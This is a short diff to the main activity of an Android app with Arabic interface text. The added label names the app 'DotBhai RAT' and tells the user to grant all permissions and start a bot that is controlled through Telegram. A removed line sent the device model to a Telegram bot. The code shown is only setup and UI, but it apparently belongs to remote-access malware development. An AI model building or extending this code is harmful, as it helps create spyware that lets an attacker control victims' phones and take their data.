@@ -37,12 +37,12 @@ public class MainActivity extends Activity {
         layout.setPadding(50, 50, 50, 50);
 
         TextView tv = new TextView(this);
-        tv.setText("اضغط الزر بالأسفل لتشغيل البوت.\nتأكد من الموافقة على جميع الأذونات.");
-        tv.setTextSize(16);
+        tv.setText("DotBhai RAT\n\n1. اقبل الأذونات\n2. اضغط تشغيل البوت\n3. أرسل /start في تلجرام");
+        tv.setTextSize(18);
         layout.addView(tv);
 
         Button btnStart = new Button(this);
-        btnStart.setText("تشغيل البوت");
+        btnStart.setText("تشغيل البوت الآن");
         layout.addView(btnStart);
 
         setContentView(layout);
@@ -60,8 +60,7 @@ public class MainActivity extends Activity {
                     startService(serviceIntent);
                 }
                 
-                TelegramSender.sendMessage("🚀 <b>التطبيق جاهز</b>\n" + Build.MODEL + "\nأرسل /start");
-                Toast.makeText(this, "تم التشغيل! روح لتلجرام وأرسل /start", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "جاري تشغيل الخدمة... افتح تلجرام وأرسل /start", Toast.LENGTH_LONG).show();
             } catch (Exception e) {
                 Toast.makeText(this, "خطأ: " + e.getMessage(), Toast.LENGTH_LONG).show();
             }
